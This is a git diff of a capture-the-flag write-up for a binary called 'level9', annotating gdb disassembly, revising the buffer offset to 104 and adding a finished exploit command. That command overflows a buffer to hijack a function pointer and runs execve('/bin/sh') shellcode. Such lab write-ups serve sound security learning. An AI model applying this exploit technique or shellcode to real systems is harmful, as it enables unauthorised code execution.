@@ -100,9 +100,9 @@ Dump of assembler code for function main:
    0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
    0x08048674 <+128>:	mov    DWORD PTR [esp],eax
    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> <-- method of N class
-   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
-   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
-   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]            <-- load address (access the object address)
+   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]                 <-- first dereference (access the object's method)
+   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]                 <-- second dereference (access the method's value)
    0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
    0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
    0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
@@ -147,28 +147,14 @@ So we have gathered so far:
 - there's a function pointer called from inside the code, stored in eax register.
   - we could write the address of that arbitrary code at this location so that the normal execution of the program would do all the heavy lifting.
 
-In order to successfully call a `system("/bin/sh")` from that function pointer we need several information:
-1. address of `systemcall`
-2. address of `/bin/sh`
-3. buffer offset
-4. the address returned by the method call ( which is then stored in eax )
+In order to successfully call a `system("/bin/sh")` from that function pointer we need the following:
+1. A valid shellcode capable of invoking a shell from within the binary
+2. buffer offset + to take into account the padding for the buffer address
+3. the address returned by the `memcpy` function inside the method call ( which is stored in eax )
 
-## system("/bin/sh")
+## Shellcode
 
-```gdb
-gdb-peda$ info function system
-All functions matching regular expression "system":
-
-Non-debugging symbols:
-[...]
-0xb7d86060  __libc_system                           <-- address of system function
-0xb7d86060  system                                  <-- address of system function
-0xb7e64550  svcerr_systemerr
-gdb-peda$ find "\/bin/sh" 0xb7d47000 0xb7eed000
-Searching for '\\/bin/sh' in range: 0xb7d47000 - 0xb7eed000
-Found 1 results, display max 1 items:
-libc : 0xb7ea7c58 ("/bin/sh")                       <-- address of "/bin/sh"
-```
+Finding the shellcode is rather easy, we just need to find one that fits with our current architecture.
 
 ## finding the buffer offset
 
@@ -212,7 +198,11 @@ Stopped reason: SIGSEGV
 
 ![](Ressources/pattern_gen.png)
 
-So the offset of the buffer is of 108.
+So the offset of the buffer is of `104`.
+
+From that we can deduce the length the payload must have:
+
+`104` (buffer size) + `4` (buffer address) + `4` (overwritten address) = `112` of payload length
 
 ## address of eax 
 
@@ -261,4 +251,8 @@ Breakpoint 1, 0x0804867c in main ()
 
 ## payload
 
-[WIP]
+Using [this](https://www.exploit-db.com/exploits/42428) shellcode:
+```shell-session
+./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'B' * 80 + '\x0c\xa0\x04\x08'")
+```
+                           |-address-in-eax+4| + |------------------------------------------------------------------------------------------------| + |padding|+ |-address-in-eax-|
